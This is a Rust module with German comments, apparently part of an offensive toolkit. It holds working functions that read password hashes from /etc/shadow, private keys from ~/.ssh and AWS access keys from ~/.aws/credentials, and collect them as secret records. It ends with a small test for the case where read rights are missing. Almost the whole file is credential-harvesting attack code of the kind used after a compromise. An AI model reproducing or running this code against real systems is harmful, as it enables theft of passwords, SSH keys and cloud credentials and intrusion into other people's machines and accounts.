//! POSIX-Secrets-Extraktion: /etc/shadow, SSH-Keys, AWS-Credentials.
//!
//! Erfordert in der Regel Root-Rechte. Auf Nicht-Unix-Plattformen liefern die
//! Funktionen leere Ergebnisse oder einen Fehler.

#[cfg(unix)]
use tracing::debug;

pub use kx_core::secret::Secret;

use crate::error::PosixError;

/// Extrahiere Passwort-Hashes aus /etc/shadow.
///
/// # Rückgabe
/// Vektor der gefundenen Secrets (leer, wenn keine Rechte oder kein Unix).
#[cfg(unix)]
pub async fn extract_shadow_hashes() -> Result<Vec<Secret>, PosixError> {
    let shadow = std::path::Path::new("/etc/shadow");
    if !shadow.exists() {
        debug!("/etc/shadow nicht gefunden — keine Hashes extrahiert");
        return Ok(vec![]);
    }
    // Ohne Leserechte ist das der Normalfall auf jedem Nicht-Root-Host:
    // /etc/shadow gehört root:shadow mit Modus 640. Das ist kein Fehler,
    // sondern "keine Hashes extrahierbar" — extract_ssh_keys verhält sich
    // genauso (dort schlägt ein Lesefehler nicht fehl).
    let content = match std::fs::read_to_string(shadow) {
        Ok(c) => c,
        Err(e) if e.kind() == std::io::ErrorKind::PermissionDenied => {
            debug!("/etc/shadow nicht lesbar ({e}) — keine Hashes extrahiert");
            return Ok(vec![]);
        }
        Err(e) => return Err(PosixError::FileAccess(e.to_string())),
    };
    let mut secrets = Vec::new();
    for line in content.lines() {
        let parts: Vec<&str> = line.split(':').collect();
        if parts.len() >= 2 {
            let user = parts[0].to_string();
            let hash = parts[1].to_string();
            // Leerzeichen oder "!" bedeutet gesperrtes Konto — überspringen.
            if hash.is_empty() || hash == "!" || hash.starts_with("!*") {
                continue;
            }
            secrets.push(Secret {
                secret_type: "shadow".into(),
                target: user,
                value: hash,
                source: "/etc/shadow".into(),
            });
        }
    }
    debug!("{} shadow-Hashes extrahiert", secrets.len());
    Ok(secrets)
}

/// Extrahiere SSH-Private-Keys aus den Standard-Verzeichnissen.
#[cfg(unix)]
pub async fn extract_ssh_keys() -> Result<Vec<Secret>, PosixError> {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
    let ssh_dir = format!("{home}/.ssh");
    let mut secrets = Vec::new();
    let entries = match std::fs::read_dir(&ssh_dir) {
        Ok(e) => e,
        Err(_) => return Ok(secrets),
    };
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        let path = entry.path();
        if path.is_file()
            && !name.ends_with(".pub")
            && (name.starts_with("id_") || name.contains("private") || name.contains("key"))
        {
            if let Ok(content) = std::fs::read_to_string(&path) {
                if content.contains("PRIVATE KEY") {
                    secrets.push(Secret {
                        secret_type: "ssh_key".into(),
                        target: name.clone(),
                        value: content,
                        source: format!("{ssh_dir}/{name}"),
                    });
                }
            }
        }
    }
    debug!("{} SSH-Keys extrahiert", secrets.len());
    Ok(secrets)
}

/// Extrahiere AWS-Access-Keys aus ~/.aws/credentials.
#[cfg(unix)]
pub async fn extract_aws_credentials() -> Result<Vec<Secret>, PosixError> {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
    let creds_path = format!("{home}/.aws/credentials");
    let creds = std::path::Path::new(&creds_path);
    if !creds.exists() {
        return Ok(vec![]);
    }
    // Wie bei /etc/shadow: fehlende Leserechte sind kein Fehler, sondern
    // "keine Credentials extrahierbar".
    let content = match std::fs::read_to_string(creds) {
        Ok(c) => c,
        Err(e) if e.kind() == std::io::ErrorKind::PermissionDenied => {
            debug!("$HOME/.aws/credentials nicht lesbar ({e}) — keine Credentials extrahiert");
            return Ok(vec![]);
        }
        Err(e) => return Err(PosixError::FileAccess(e.to_string())),
    };
    let mut secrets = Vec::new();
    let mut profile = "default".to_string();
    for line in content.lines() {
        let line = line.trim();
        if line.starts_with('[') && line.ends_with(']') {
            profile = line.trim_matches(|c| c == '[' || c == ']').to_string();
        } else if let Some((k, v)) = line.split_once('=') {
            let key = k.trim();
            let val = v.trim();
            if key == "aws_access_key_id" || key == "aws_secret_access_key" {
                secrets.push(Secret {
                    secret_type: "aws".into(),
                    target: format!("{profile}/{key}"),
                    value: val.to_string(),
                    source: creds_path.clone(),
                });
            }
        }
    }
    debug!("{} AWS-Credentials extrahiert", secrets.len());
    Ok(secrets)
}

// Nicht-Unix-Plattformen: leere Implementierungen für cross-platform-Build.
#[cfg(not(unix))]
pub async fn extract_shadow_hashes() -> Result<Vec<Secret>, PosixError> {
    Ok(vec![])
}

#[cfg(not(unix))]
pub async fn extract_ssh_keys() -> Result<Vec<Secret>, PosixError> {
    Ok(vec![])
}

#[cfg(not(unix))]
pub async fn extract_aws_credentials() -> Result<Vec<Secret>, PosixError> {
    Ok(vec![])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn shadow_extracts_nothing_on_nonunix_or_missing() {
        // Auf CI ohne /etc/shadow-Leserechte: leerer Vektor, kein Panic.
        // Fehlende Leserechte sind auf jedem Nicht-Root-Host der Normalfall
        // und dürfen die Funktion nicht scheitern lassen — der Ubuntu-Runner
        // liest /etc/shadow als nicht privilegierter User nicht.
        let res = extract_shadow_hashes().await;
        assert!(res.is_ok(), "fehlende Leserechte sind kein Fehler: {res:?}");
    }
}
